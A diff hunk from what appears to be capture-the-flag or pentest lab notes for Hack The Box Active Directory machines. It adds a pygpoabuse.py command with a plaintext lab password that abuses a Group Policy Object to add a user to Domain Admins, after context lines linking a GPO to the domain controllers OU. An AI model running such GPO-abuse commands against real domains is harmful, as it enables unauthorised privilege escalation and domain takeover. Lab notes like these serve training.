@@ -1066,6 +1066,9 @@ New-GPLink -Name "0xdf" -target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"
 
 gpupdate /force
 ```
+```bash
+python3 pygpoabuse.py baby2.vl/gpoadm:'Summer2026!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname test -dc-ip 10.129.8.152 -command 'net group "domain admins" gpoadm /add' -filter-enabled -target-dns-name dc.baby2.vl
+```
   
 </details>
 
